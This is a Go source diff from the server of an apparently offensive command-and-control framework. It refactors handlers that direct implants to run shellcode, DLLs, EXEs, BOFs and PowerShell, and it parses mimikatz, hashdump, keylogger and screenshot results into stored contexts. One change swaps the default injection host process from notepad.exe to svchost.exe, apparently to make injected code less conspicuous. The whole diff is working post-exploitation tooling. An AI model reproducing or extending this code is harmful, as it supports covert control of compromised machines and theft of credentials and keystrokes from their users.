@@ -7,11 +7,12 @@ import (
 	"math"
 	"strings"
 
+	"github.com/chainreactors/IoM-go/consts"
+	"github.com/chainreactors/IoM-go/proto/client/clientpb"
+	implantpb "github.com/chainreactors/IoM-go/proto/implant/implantpb"
+	"github.com/chainreactors/IoM-go/types"
+
 	"github.com/chainreactors/logs"
-	"github.com/chainreactors/malice-network/helper/consts"
-	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
-	"github.com/chainreactors/malice-network/helper/proto/implant/implantpb"
-	"github.com/chainreactors/malice-network/helper/types"
 	"github.com/chainreactors/malice-network/helper/utils/output"
 	"github.com/chainreactors/malice-network/server/internal/core"
 	"github.com/chainreactors/malice-network/server/internal/db"
@@ -23,7 +24,7 @@ import (
 
 func handleBinary(binary *implantpb.ExecuteBinary) *implantpb.ExecuteBinary {
 	if binary.ProcessName == "" {
-		binary.ProcessName = `C:\\Windows\\System32\\notepad.exe`
+		binary.ProcessName = `C:\\Windows\\System32\\svchost.exe`
 	}
 	if binary.Timeout == 0 {
 		binary.Timeout = math.MaxUint32
@@ -36,8 +37,8 @@ func handleBinary(binary *implantpb.ExecuteBinary) *implantpb.ExecuteBinary {
 }
 
 func ContextCallback(task *core.Task, ctx context.Context) func(*implantpb.Spite) {
-	typ, nonce := getContextNonce(ctx)
-	if typ == "" || nonce == "" {
+	meta := getContextMeta(ctx)
+	if meta.ContextType == "" || meta.Nonce == "" {
 		return func(spite *implantpb.Spite) {
 			return
 		}
@@ -45,55 +46,92 @@ func ContextCallback(task *core.Task, ctx context.Context) func(*implantpb.Spite
 	return func(spite *implantpb.Spite) {
 		content := spite.GetBinaryResponse().GetData()
 		if content == nil {
-			logs.Log.Error("Empty content")
+			content = []byte(spite.GetResponse().GetOutput())
+			if content == nil {
+				logs.Log.Error("Empty content")
+				return
+			}
+		}
+		saveTaskContextsFromContent(task, meta, content)
+	}
+}
+
+func saveTaskContextsFromContent(task *core.Task, meta contextRequestMeta, content []byte) {
+	var ctxs output.Contexts
+	switch meta.ContextType {
+	case consts.ContextMedia:
+		if err := core.HandleMediaChunk(task, meta.Nonce, meta.Identifier, meta.FileName, meta.MediaKind, content); err != nil {
+			logs.Log.Error(err)
+		}
+		return
+	case output.GOGOPortType:
+		c, err := output.ParseGOGO(content)
+		if err != nil {
+			logs.Log.Error(err)
 			return
 		}
-		var ctxs output.Contexts
-		switch typ {
-		case output.GOGOPortType:
-			c, err := output.ParseGOGO(content)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
+		ctxs = append(ctxs, c)
+	case "zombie":
+		cs, err := output.ParseZombie(content)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		for _, c := range cs {
 			ctxs = append(ctxs, c)
-		case "zombie":
-			cs, err := output.ParseZombie(content)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-			for _, c := range cs {
-				ctxs = append(ctxs, c)
-			}
+		}
+	case "mimikatz":
+		cs, err := output.ParseMimikatz(content)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		for _, c := range cs {
+			ctxs = append(ctxs, c)
+		}
+	case "hashdump":
+		cs, err := output.ParseHashdump(content)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		for _, c := range cs {
+			ctxs = append(ctxs, c)
+		}
+	case consts.ContextKeyLogger:
+		err := core.HandleKeylogger(content, task, meta.Identifier, meta.FileName, meta.Nonce)
+		if err != nil {
+			logs.Log.Error(err)
+			return
+		}
+		return
+	}
+
+	for _, c := range ctxs {
+		value, err := json.Marshal(c)
+		if err != nil {
+			logs.Log.Error(err)
+			return
 		}
 
-		for _, c := range ctxs {
-			value, err := json.Marshal(c)
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-
-			model, err := db.SaveContext(&clientpb.Context{
-				Task:    task.ToProtobuf(),
-				Session: task.Session.ToProtobufLite(),
-				Type:    c.Type(),
-				Value:   value,
-				Nonce:   nonce,
-			})
-			if err != nil {
-				logs.Log.Error(err)
-				return
-			}
-
-			core.EventBroker.Publish(core.Event{
-				EventType: consts.EventContext,
-				Op:        c.Type(),
-				Task:      task.ToProtobuf(),
-				Message:   fmt.Sprintf("new %s context: %s", c.Type(), model.ID),
-			})
+		model, err := db.SaveContext(&clientpb.Context{
+			Task:    task.ToProtobuf(),
+			Session: task.Session.ToProtobufLite(),
+			Type:    c.Type(),
+			Value:   value,
+			Nonce:   meta.Nonce,
+		})
+		if err != nil {
+			logs.Log.Error(err)
+			return
 		}
+
+		core.EventBroker.Publish(core.Event{
+			EventType: consts.EventContext,
+			Op:        c.Type(),
+			Task:      task.ToProtobuf(),
+			Message:   fmt.Sprintf("new %s context: %s", c.Type(), model.ID),
+		})
 	}
 }
 
@@ -102,174 +140,128 @@ func (rpc *Server) Execute(ctx context.Context, req *implantpb.ExecRequest) (*cl
 	if err != nil {
 		return nil, err
 	}
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
+	if !req.Realtime {
+		ch, err := rpc.GenericHandler(ctx, greq)
+		if err != nil {
+			return nil, err
+		}
+
+		greq.HandlerResponse(ch, types.MsgExec)
+	} else {
+		greq.Count = -1
+		_, out, err := rpc.StreamGenericHandler(ctx, greq)
+		if err != nil {
+			return nil, err
+		}
+
+		runTaskHandler(greq.Task, func() error {
+			for {
+				resp, ok := recvSpite(greq.Task.Ctx, out)
+				if !ok {
+					return ErrTaskContextCancelled
+				}
+				exec := resp.GetExecResponse()
+				err := types.AssertSpite(resp, types.MsgExec)
+				if err != nil {
+					return buildTaskError(err)
+				}
+				err = greq.HandlerSpite(resp)
+				if err != nil {
+					return err
+				}
+				if exec.End {
+					greq.Task.Finish(resp, "")
+					break
+				}
+			}
+			return nil
+		}, greq.Task.Close)
 	}
 
-	go greq.HandlerResponse(ch, types.MsgExec)
 	return greq.Task.ToProtobuf(), nil
+
 }
 
 func (rpc *Server) ExecuteAssembly(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
 }
 
 func (rpc *Server) ExecuteShellcode(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	req = handleBinary(req)
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse, ContextCallback(greq.Task, ctx))
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternalWithSession(ctx, req, types.MsgBinaryResponse, func(greq *GenericRequest, spite *implantpb.Spite) {
+		ContextCallback(greq.Task, ctx)(spite)
+	})
 }
 
 func (rpc *Server) ExecuteBof(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse, func(spite *implantpb.Spite) {
+	return rpc.GenericInternalWithSession(ctx, req, types.MsgBinaryResponse, func(greq *GenericRequest, spite *implantpb.Spite) {
 		tctx := greq.TaskContext(spite)
 		bofResps, err := output.ParseBOFResponse(tctx)
 		if err != nil {
 			logs.Log.Error(err)
 			return
 		}
+
+		// handler context bof callback
+		meta := getContextMeta(ctx)
 		var results strings.Builder
 		for _, bofResp := range bofResps.(output.BOFResponses) {
 			switch bofResp.CallbackType {
-			case output.CALLBACK_OUTPUT, output.CALLBACK_OUTPUT_OEM, output.CALLBACK_OUTPUT_UTF8:
-				continue
-			case output.CALLBACK_ERROR:
-				continue
-			case output.CALLBACK_SCREENSHOT:
+			case output.CallbackOutput, output.CallbackOutputOem, output.CallbackOutputUtf8:
+				results.Write(bofResp.Data)
+			case output.CallbackScreenshot:
 				if bofResp.Length <= 4 {
 					results.WriteString("Null screenshot data\n")
 					continue
 				}
 				err = core.HandleScreenshot(bofResp.Data, greq.Task)
-			case output.CALLBACK_FILE:
+			case output.CallbackFile:
 				err = core.HandleFileOperations("open", bofResp.Data, greq.Task)
-			case output.CALLBACK_FILE_WRITE:
+			case output.CallbackFileWrite:
 				err = core.HandleFileOperations("write", bofResp.Data, greq.Task)
-			case output.CALLBACK_FILE_CLOSE:
+			case output.CallbackFileClose:
 				err = core.HandleFileOperations("close", bofResp.Data, greq.Task)
 			default:
-				logs.Log.Errorf("Unimplemented callback type : %d", bofResp.CallbackType)
+				continue
 			}
 		}
+		if meta.ContextType != "" && meta.Nonce != "" && results.Len() > 0 {
+			saveTaskContextsFromContent(greq.Task, meta, []byte(results.String()))
+		}
 	})
-
-	return greq.Task.ToProtobuf(), nil
 }
 
 func (rpc *Server) ExecuteEXE(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	req = handleBinary(req)
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternalWithSession(ctx, req, types.MsgBinaryResponse, func(greq *GenericRequest, spite *implantpb.Spite) {
+		ContextCallback(greq.Task, ctx)(spite)
+	})
 }
 
 func (rpc *Server) ExecuteDll(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	req = handleBinary(req)
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
+	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
+}
 
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+func (rpc *Server) ExecuteDLL(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
+	return rpc.ExecuteDll(ctx, req)
 }
 
 func (rpc *Server) ExecutePowerpick(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
 }
 
 func (rpc *Server) ExecuteArmory(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	req = handleBinary(req)
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
 }
 
 func (rpc *Server) ExecuteLocal(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	req = handleBinary(req)
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
 }
 
 func (rpc *Server) InlineLocal(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
 	req = handleBinary(req)
-	greq, err := newGenericRequest(ctx, req)
-	if err != nil {
-		return nil, err
-	}
-
-	ch, err := rpc.GenericHandler(ctx, greq)
-	if err != nil {
-		return nil, err
-	}
-	go greq.HandlerResponse(ch, types.MsgBinaryResponse)
-	return greq.Task.ToProtobuf(), nil
+	return rpc.GenericInternal(ctx, req, types.MsgBinaryResponse)
 }
